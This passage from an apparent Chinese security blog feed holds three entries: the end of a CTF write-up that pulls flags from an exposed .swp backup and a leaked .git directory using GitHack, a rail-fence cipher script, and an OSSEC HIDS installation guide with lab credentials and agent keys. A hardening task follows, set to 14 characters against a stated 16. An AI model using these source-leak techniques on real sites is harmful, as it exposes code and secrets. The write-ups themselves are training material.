data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210913181114.png"></p></li><li><p>(6)根据提示flag1就在这路径,我们进入到</p><pre class="line-numbers language-none"><code class="language-none">http://eci-2ze5s8j33kfzmce3ljvb.cloudeci1.ichunqiu.com//flag1_is_her3_fun.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210913182233.png"></p></li><li><p> 就可以获得第一段的flag</p></li><li><p>进入.index.php.swp,将文件保存到电脑,使用记事本打开<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210913182640.png"></p></li><li><p>就可以获得第三段flag</p></li><li><p>最后拼接起来来</p><pre class="line-numbers language-none"><code class="language-none">flag1:n1book{info_1flag2:s_v3ry_im flag3:p0rtant_hack}最终答案n1book{info_1s_v3ry_im p0rtant_hack}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="第二题粗心的小李"><a href="#第二题粗心的小李" class="headerlink" title="第二题粗心的小李"></a>第二题粗心的小李</h6><pre class="line-numbers language-none"><code class="language-none">环境链接:http://eci-2ze66ydaexstbikm0k5c.cloudeci1.ichunqiu.com/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">使用工具gitHackr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>步骤</p></li><li><p>进入靶场<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210914103512.png"></p></li><li><p>根据题目提示这主要还是考察工具的使用,首先我们使用gitHacker对网站进行扫描</p><pre class="line-numbers language-none"><code class="language-none">python GitHack.py http://eci-2ze66ydaexstbikm0k5c.cloudeci1.ichunqiu.com/.git/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210914103933.png"></p></li><li><p>扫描的结果在目录下,我们可以ls<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210914104113.png"></p></li><li><p>这里就多出了我们刚才扫过网站的一个文件夹,我们cd进入里面使用cat 查看index里面的内容<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210914104309.png"><br>最终答案</p><pre class="line-numbers language-none"><code class="language-none">1book{git_looks_s0_easyfun}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://www.xiaocaibi.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF常用python脚本</title>
    <link href="http://www.xiaocaibi.top/posts/19f567c6.html"/>
    <id>http://www.xiaocaibi.top/posts/19f567c6.html</id>
    <published>2021-09-13T07:30:40.000Z</published>
    <updated>2021-09-20T08:47:43.775Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="CTF常用脚本"><a href="#CTF常用脚本" class="headerlink" title="CTF常用脚本"></a>CTF常用脚本</h2><h4 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h4><pre class="line-numbers language-none"><code class="language-none">string = input("输入:")frequency = [] # 获得栅栏的栏数result_len = len(string)        # 栅栏密码的总长度  25for i in range(2, result_len):   # 最小栅栏长度为2   逐个测试2,3,4....    if(result_len % i == 0):        # 当栅栏密码的总长度 模 i 余数为0  则这个i就是栅栏密码的长度        frequency.append(i)for numberOfColumn in frequency:   # 循环可能分的栏数    RESULT = []                 #  保存各栏数的结果    for i in range(numberOfColumn):     #   i : 开始取值的位置        for j in range(i, result_len, numberOfColumn):  # 开始取值， 隔栏数取一个值， 起始位置是i            RESULT.append(string[j])    print("".join(RESULT))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://www.xiaocaibi.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ossec</title>
    <link href="http://www.xiaocaibi.top/posts/3e4c61fa.html"/>
    <id>http://www.xiaocaibi.top/posts/3e4c61fa.html</id>
    <published>2021-08-23T11:18:30.000Z</published>
    <updated>2021-09-20T08:47:43.791Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="OSSEC配置"><a href="#OSSEC配置" class="headerlink" title="OSSEC配置"></a>OSSEC配置</h2><p>②安装配置ossec在服务端配置 iptables 放行 OSSEC 通信端口；<br>在数据库中创建 ossec 数据库和 ossec用户，并授权给予ossec用户管 理 ossec 数据库的所有权限；<br>执行相应脚本安装 ossec服务端，安装目录为/usr/local/ossec/,开启联动 (active response)功能，运行 rootkit 检测，接受远程机器syslog；<br>导入 ossec 服务端基本表结构到 mysql的ossec 数据库中；<br>配置接收远程主机 syslog 的 ip 网段为 10.1.2.0 网段；<br>添加 Web_Server(Server4) 和 File_Server(Server2) 为 agent端，agent ID 分别为 001、002；<br>为 ossec 服务端配置 webui 管理界面 OSSEC 上的工作任务；<br>③配置管理<br>添加 Web_Server“/home/wwwlogs/”目录下的access 日志到 ossec日志源中；<br>新建规则，规则名为 alert_attack、id 为 31180、level 为 6，检测wordpress url 地址包含.php 的文件，当 60 秒内同一 IP 访问.php文件超过20次， 触发该规则，命中信息为attacks_info；<br>新建规则，规则名为alert_php，当Web_Server 中 index.php发生改变时发出警告，命中述信息为 index.php changed；<br>配置规则，规则名为alert_port，检测Web_Server监听端口，当端口发生改变时产生报警日志，命中信息为 port changed；<br>配置 ossec将level为10的警告信息发送到<a href="mailto:admin@worldskills2020.gd">admin@worldskills2020.gd</a>邮箱</p><h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><pre class="line-numbers language-none"><code class="language-none">centos7 两台服务端ip 192.168.8.12客户端ip 192.168.8.13<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>安装源码</p><pre class="line-numbers language-none"><code class="language-none">wget https://github.com/ossec/ossec-hids/archive/refs/tags/3.6.0.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>web界面源码</p><pre class="line-numbers language-none"><code class="language-none">wget https://github.com/ossec/ossec-wui/archive/refs/tags/0.9.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="服务端安装"><a href="#服务端安装" class="headerlink" title="服务端安装"></a>服务端安装</h4><pre class="line-numbers language-none"><code class="language-none">[root@server ~]# cd /tmp/   ///进入tmp目录[root@server tmp]# wget https://github.com/ossec/ossec-hids/archive/refs/tags/3.6.0.tar.gz  ///下载源码[root@server tmp]# tar -zvxf 3.6.0.tar.gz   ///解压源码[root@server tmp]# cd ossec-hids-3.6.0/     ///进入解压的文件目录[root@server ossec-hids-3.6.0]# cai INSTALL ///使用cai INSTALL来查看需要安装的依赖[root@server ossec-hids-3.6.0]# yum install libssl libevent libpcre2 libz make gcc -y  ///安装依赖[root@server src]# make help   ///查看帮助文档[root@server src]# make TARGET=server PREFIX=/usr/local/ossec DATABASE=mysql 编译<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210825113517.png"></p></li><li><p>编译报错,缺少依赖 我们需要安装缺少的依赖,可以使用 yum search pcre2来查找安装包<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210825113838.png"></p><pre class="line-numbers language-none"><code class="language-none">#安装缺少的依赖包,然后重新编译yum search pcre2yum install pcre2-devel -yyum install libevent-devel -yyum install zlib-devel -yyum install openssl-devel -yyum install mariadb-devel -yyum install mariadb-devel -y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>编译完成<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210825114258.png"></p><pre class="line-numbers language-none"><code class="language-none">[root@server ossec-hids-3.6.0]# ./install.sh  ** Para instalação em português, escolha [br].  ** 要使用中文进行安装, 请选择 [cn].  ** Fur eine deutsche Installation wohlen Sie [de].  ** Για εγκατάσταση στα Ελληνικά, επιλέξτε [el].  ** For installation in English, choose [en].  ** Para instalar en Español , eliga [es].  ** Pour une installation en français, choisissez [fr]  ** A Magyar nyelvű telepítéshez válassza [hu].  ** Per l'installazione in Italiano, scegli [it].  ** 日本語でインストールします．選択して下さい．[jp].  ** Voor installatie in het Nederlands, kies [nl].  ** Aby instalować w języku Polskim, wybierz [pl].  ** Для инструкций по установке на русском ,введите [ru].  ** Za instalaciju na srpskom, izaberi [sr].  ** Türkçe kurulum için seçin [tr].  (en/br/cn/de/el/es/fr/hu/it/jp/nl/pl/ru/sr/tr) [en]: cn OSSEC HIDS v3.6.0 安装脚本 - http://www.ossec.net 您将开始 OSSEC HIDS 的安装. 请确认在您的机器上已经正确安装了 C 编译器.  - 系统类型: Linux server 3.10.0-862.el7.x86_64  - 用户: root  - 主机: server  -- 按 ENTER 继续或 Ctrl-C 退出. --1- 您希望哪一种安装 (server, agent, local or help)? server  - 选择了 Server 类型的安装.2- 正在初始化安装环境. - 请选择 OSSEC HIDS 的安装路径 [/var/ossec]: /usr/local/ossec    - OSSEC HIDS 将安装在  /usr/local/ossec .3- 正在配置 OSSEC HIDS.  3.1- 您希望收到e-mail告警吗? (y/n) [y]: y   - 请输入您的 e-mail 地址? admin@worldskills2020.gd   - 请输入您的 SMTP 服务器IP或主机名 ? localhost  3.2- 您希望运行系统完整性检测模块吗? (y/n) [y]: y   - 系统完整性检测模块将被部署.  3.3- 您希望运行 rootkit检测吗? (y/n) [y]: y   - rootkit检测将被部署.  3.4- 关联响应允许您在分析已接收事件的基础上执行一个       已定义的命令.       例如,你可以阻止某个IP地址的访问或禁止某个用户的访问权限.       更多的信息,您可以访问:       http://www.ossec.net/en/manual.html#active-response   - 您希望开启联动(active response)功能吗? (y/n) [y]: y     - 关联响应已开启   - 默认情况下, 我们开启了主机拒绝和防火墙拒绝两种响应.     第一种情况将添加一个主机到 /etc/hosts.deny.     第二种情况将在iptables(linux)或ipfilter(Solaris,     FreeBSD 或 NetBSD）中拒绝该主机的访问.   - 该功能可以用以阻止 SSHD 暴力攻击, 端口扫描和其他     一些形式的攻击. 同样你也可以将他们添加到其他地方,     例如将他们添加为 snort 的事件.   - 您希望开启防火墙联动(firewall-drop)功能吗? (y/n) [y]: n     - 防火墙联动(firewall-drop)被关闭.   -      - 114.114.114.114   - 您希望添加更多的IP到白名单吗? (y/n)? [n]: y   - 请输入IP (用空格进行分隔): 192.168.8.12 192.168.8.13  3.5- 您希望接收远程机器syslog吗 (port 514 udp)? (y/n) [y]: y   - 远程机器syslog将被接收.  3.6- 设置配置文件以分析一下日志:    -- /var/log/messages    -- /var/log/secure    -- /var/log/maillog -如果你希望监控其他文件, 只需要在配置文件ossec.conf中  添加新的一项.  任何关于配置的疑问您都可以在 http://www.ossec.net 找到答案.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h6><pre class="line-numbers language-none"><code class="language-none">[root@server ossec-hids-3.6.0]# yum install mariadb-server.x86_64 -y   ///安装数据库[root@server ossec-hids-3.6.0]# systemctl enable mariadb.service[root@server ossec-hids-3.6.0]# systemctl start mariadb.service ///启动数据库[root@server ossec-hids-3.6.0]# mysql ///进入数据库MariaDB [(none)]&gt; create database ossec;MariaDB [(none)]&gt; CREATE USER 'ossec'@'localhost' IDENTIFIED BY 'ossec';Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; GRANT ALL ON *.* TO 'ossec'@'localhost';Query OK, 0 rows affected (0.00 sec)[root@server ossec-hids-3.6.0]# find . -type f -name "*mysql*"   ///查找关键字mysql[root@server ossec-hids-3.6.0]# mysql ossec &lt;./src/os_dbd/mysql.schema   ///将mysql.schema导入到数据库[root@server ~]# vim /usr/local/ossec/etc/ossec.conf&lt;ossec_config&gt;    &lt;database_output&gt;          &lt;hostname&gt;locahost&lt;/hostname&gt;          &lt;username&gt;ossec&lt;/username&gt;          &lt;password&gt;ossec&lt;/password&gt;          &lt;database&gt;ossec&lt;/database&gt;          &lt;type&gt;mysql&lt;/type&gt;   &lt;/database_output&gt;&lt;/ossec_config&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="生成客户端密钥"><a href="#生成客户端密钥" class="headerlink" title="生成客户端密钥"></a>生成客户端密钥</h6><pre class="line-numbers language-none"><code class="language-none">[root@server ~]# cd /usr/local/ossec/bin/[root@server bin]# ls[root@server bin]# ./manage_agents***************************************** OSSEC HIDS v3.6.0 Agent manager.     ** The following options are available: *****************************************   (A)dd an agent (A).   (E)xtract key for an agent (E).   (L)ist already added agents (L).   (R)emove an agent (R).   (Q)uit.Choose your action: A,E,L,R or Q:  A   ///这里选择A- Adding a new agent (use '\q' to return to the main menu).  Please provide the following:   * A name for the new agent: name1  ///名字随便填这里我填的式name1   * The IP Address of the new agent: 192.168.8.13 ///ip地址指定客户端也就是另一台linux系统ip地址   * An ID for the new agent[001]: 001Agent information:   ID:001   Name:name1   IP Address:192.168.8.13Confirm adding it?(y/n): yAgent added with ID 001.## 查看密钥***************************************** OSSEC HIDS v3.6.0 Agent manager.     ** The following options are available: *****************************************   (A)dd an agent (A).   (E)xtract key for an agent (E).   (L)ist already added agents (L).   (R)emove an agent (R).   (Q)uit.Choose your action: A,E,L,R or Q:  E  //选择EAvailable agents:   ID: 001, Name: name1, IP: 192.168.8.13Provide the ID of the agent to extract the key (or '\q' to quit): 001 ///输入001Agent key information for '001' is:MDAxIG5hbWUxIDE5Mi4xNjguOC4xMyBhZjMyMWIwMmQ4MTgxZDI0YjZhZjBhM2M2Nzg3MDI1YjBiMWIyM2E1NjNlMTBmMDk1YzE1ZDg3ZTAwMGE2MzBk** Press ENTER to return to the main menu.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="安装web界面"><a href="#安装web界面" class="headerlink" title="安装web界面"></a>安装web界面</h6><pre class="line-numbers language-none"><code class="language-none">[root@server tmp]# pwd/tmp[root@server tmp]# yum install httpd php -y  ///安装apache和php环境[root@server tmp]# wget https://github.com/ossec/ossec-wui/archive/refs/tags/0.9.tar.gz   ///下载源码[root@server tmp]# tar -zvxf 0.9.tar.gz   ///解压源码[root@server tmp]# cd ossec-wui-0.9/[root@server ossec-wui-0.9]# lsCONTRIB  css  htaccess_def.txt  img  index.php  js  lib  LICENSE  ossec_conf.php  README  README.search[root@server ossec-wui-0.9]# cat README   ///查看使用文档[root@server ossec-wui-0.9]# cd ..        ///放回上一级[root@server tmp]# mv ossec-wui* /var/www/html/ossec-wui   ///使用mv将文件移动到html目录下面[root@server tmp]# cd /var/www/html/ossec-wui/   ///进入[root@server ossec-wui]# lsCONTRIB  css  htaccess_def.txt  img  index.php  js  lib  LICENSE  ossec_conf.php  README  README.search[root@server ossec-wui]# ./setup.sh  ///运行Setting up ossec ui...Username: rootNew password:    ///随便填 这里我填123Re-type new password:Adding password for user rootEnter your web server user name (e.g. apache, www, nobody, www-data, ...)apache  ///选择apacheYou must restart your web server after this setup is done.Setup completed successfully.[root@server ossec-wui]# vim ossec_conf.php   ///修改文件里面的路径/* Ossec directory */$ossec_dir="/usr/local/ossec"; [root@server ossec-wui]# systemctl start httpd 启动apache服务[root@server ~]# cd /usr/local/ossec/bin/[root@server bin]# lsagent_control     ossec-analysisd  ossec-execd         ossec-monitord   rootcheck_controlclear_stats       ossec-authd      ossec-logcollector  ossec-regex      syscheck_controllist_agents       ossec-control    ossec-logtest       ossec-remoted    syscheck_updatemanage_agents     ossec-csyslogd   ossec-maild         ossec-reportd    util.shossec-agentlessd  ossec-dbd        ossec-makelists     ossec-syscheckd  verify-agent-conf[root@server bin]# ./ossec-control startStarting OSSEC HIDS v3.6.0...Started ossec-dbd...Started ossec-maild...Started ossec-execd...Started ossec-analysisd...Started ossec-logcollector...Started ossec-remoted...Started ossec-syscheckd...Started ossec-monitord...Completed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>服务端安装完成</li><li><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210825124921.png"></li></ul><h4 id="客户端安装"><a href="#客户端安装" class="headerlink" title="客户端安装"></a>客户端安装</h4><pre class="line-numbers language-none"><code class="language-none">[root@client tmp]# wget https://github.com/ossec/ossec-hids/archive/refs/tags/3.6.0.tar.gz[root@client tmp]# tar -zvxf 3.6.0.tar.gz[root@client ossec-hids-3.6.0]# cat INSTALL[root@client ossec-hids-3.6.0]# yum install libssl libevent libpcre2 libz make gcc -y yum search pcre2 yum install pcre2-devel -y yum install libevent-devel -y yum install zlib-devel -y yum install openssl-devel -y yum install mariadb-devel -y yum install mariadb-devel -y[root@client ossec-hids-3.6.0]# ./install.sh  ** Para instalação em português, escolha [br].  ** 要使用中文进行安装, 请选择 [cn].  ** Fur eine deutsche Installation wohlen Sie [de].  ** Για εγκατάσταση στα Ελληνικά, επιλέξτε [el].  ** For installation in English, choose [en].  ** Para instalar en Español , eliga [es].  ** Pour une installation en français, choisissez [fr]  ** A Magyar nyelvű telepítéshez válassza [hu].  ** Per l'installazione in Italiano, scegli [it].  ** 日本語でインストールします．選択して下さい．[jp].  ** Voor installatie in het Nederlands, kies [nl].  ** Aby instalować w języku Polskim, wybierz [pl].  ** Для инструкций по установке на русском ,введите [ru].  ** Za instalaciju na srpskom, izaberi [sr].  ** Türkçe kurulum için seçin [tr].  (en/br/cn/de/el/es/fr/hu/it/jp/nl/pl/ru/sr/tr) [en]: cn OSSEC HIDS v3.6.0 安装脚本 - http://www.ossec.net 您将开始 OSSEC HIDS 的安装. 请确认在您的机器上已经正确安装了 C 编译器.  - 系统类型: Linux client 3.10.0-862.el7.x86_64  - 用户: root  - 主机: client  -- 按 ENTER 继续或 Ctrl-C 退出. --1- 您希望哪一种安装 (server, agent, local or help)? agent  - 选择了 Agent(client) 类型的安装.2- 正在初始化安装环境. - 请选择 OSSEC HIDS 的安装路径 [/var/ossec]:    - OSSEC HIDS 将安装在  /var/ossec .3- 正在配置 OSSEC HIDS.  3.1- 请输入 OSSEC HIDS 服务器的IP地址或主机名: 192.168.8.12   - 添加服务器IP  192.168.8.12  3.2- 您希望运行系统完整性检测模块吗? (y/n) [y]: y   - 系统完整性检测模块将被部署.  3.3- 您希望运行 rootkit检测吗? (y/n) [y]: y   - rootkit检测将被部署.  3.4 - 您希望开启联动(active response)功能吗? (y/n) [y]: y  3.5- 设置配置文件以分析一下日志:    -- /var/log/messages    -- /var/log/secure    -- /var/log/maillog配置密钥[root@client ossec-hids-3.6.0]# /var/ossec/bin/manage_agents***************************************** OSSEC HIDS v3.6.0 Agent manager.     ** The following options are available: *****************************************   (I)mport key from the server (I).   (Q)uit.Choose your action: I or Q: I* Provide the Key generated by the server.* The best approach is to cut and paste it.*** OBS: Do not include spaces or new lines.Paste it here (or '\q' to quit): MDAxIG5hbWUxIDE5Mi4xNjguOC4xMyA3N2RhMzU0NmRhNTExODI3YTUwY2M1MzVjNjNkMTJmOWM5MjNlYjJiODYxNGVjMmIzNDg3NzhkN2ZkMDllNmU4Agent information:   ID:001   Name:name1   IP Address:192.168.8.13Confirm adding it?(y/n): y启动客户端[root@client ~]# /var/ossec/bin/ossec-control start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>客户端安装完成</li><li><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210825130102.png"></li></ul><h4 id="规程"><a href="#规程" class="headerlink" title="规程"></a>规程</h4><p>添加 Web_Server“/home/wwwlogs/”目录下的access 日志到 ossec日志源中</p><pre class="line-numbers language-none"><code class="language-none"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置规则，规则名为alert_port，检测Web_Server监听端口，当端口发生改变时产生报警日志，命中信息为 port changed；</p><pre class="line-numbers language-none"><code class="language-none">&lt;frequency&gt;79200&lt;/frequency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>新建规则，规则名为alert_php，当Web_Server 中 index.php发生改变时发出警告，命中述信息为 index.php changed；</p><pre class="line-numbers language-none"><code class="language-none">### 频率搜索复制粘贴/freq[root@client etc]# vim ossec.conf&lt;ossec_config&gt;  &lt;localfile&gt;    &lt;log_format&gt;full_command&lt;/log_format&gt;    &lt;command&gt;netstat -tan |grep LISTEN |egrep -v '(127.0.0.1| ::1)' | sort&lt;/command&gt;    &lt;frequency&gt;5&lt;/frequency&gt;  &lt;/localfile&gt;&lt;/ossec_config&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>新建规则，规则名为 alert_attack、id 为 31180、level 为 6，检测wordpress url 地址包含.php 的文件，当 60 秒内同一 IP 访问.php文件超过20次， 触发该规则，命中信息为attacks_info；</p><pre class="line-numbers language-none"><code class="language-none"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置 ossec将level为10的警告信息发送到<a href="mailto:admin@worldskills2020.gd">admin@worldskills2020.gd</a>邮箱</p><pre class="line-numbers language-none"><code class="language-none"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="Linux" scheme="http://www.xiaocaibi.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>模块A 基础设施设置与安全加固</title>
    <link href="http://www.xiaocaibi.top/posts/75c153fa.html"/>
    <id>http://www.xiaocaibi.top/posts/75c153fa.html</id>
    <published>2021-08-20T11:39:08.000Z</published>
    <updated>2021-09-20T08:47:43.807Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="模块A-基础设施设置与安全加固"><a href="#模块A-基础设施设置与安全加固" class="headerlink" title="模块A 基础设施设置与安全加固"></a>模块A 基础设施设置与安全加固</h1><ul><li>（本模块20分）<h4 id="一、项目和任务描述："><a href="#一、项目和任务描述：" class="headerlink" title="一、项目和任务描述："></a>一、项目和任务描述：</h4></li><li>假定你是某企业的网络安全工程师，对于企业的服务器系统，根据任-务要求确保各服务正常运行，并通过综合运用登录和密码策略、数据库安全策略、流量完整性保护策略、事件监控策略、防火墙策略等多种安全策略来提升服务器系统的网络安全防御能力。本模块要求对具体任务的操作截图并加以相应的文字说明,以word文档的形式书写,以PDF格式保存,以赛位号作为文件名.</li></ul><h4 id="二、服务器环境说明"><a href="#二、服务器环境说明" class="headerlink" title="二、服务器环境说明"></a>二、服务器环境说明</h4><ul><li><p>Windows  用户名：administrator，密码：123456</p></li><li><p>Linux    用户名：root，密码：123456</p><h4 id="三、具体任务（每个任务得分以电子答题卡为准）"><a href="#三、具体任务（每个任务得分以电子答题卡为准）" class="headerlink" title="三、具体任务（每个任务得分以电子答题卡为准）"></a>三、具体任务（每个任务得分以电子答题卡为准）</h4></li><li><p>A-1任务一 登录安全加固（Windows, Linux）</p></li><li><p>请对服务器Windows、Linux按要求进行相应的设置，提高服务器的安全性。</p></li><li><p>1.密码策略（Windows, Linux）</p></li><li><p>a.最小密码长度不少于16个字符。</p></li><li><p>(windos 步骤:)</p></li><li><p>(1)打开管理工具,点击本地安全策略<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820155512.png"></p></li><li><p>(2)进来之后点击账户策略,点击密码策略<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820155948.png"></p></li><li><p>(3)进去之后找到密码长度最小值<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820160114.png"></p></li><li><p>(4)然后我们输入14<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820160338.png"></p></li><li><p>(LINUX)</p></li><li><p>(1)进入/etc/login.defs配置文件</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820163854.png"></p></li><li><p>(2)将min_len修改成14</p></li><li><p><img 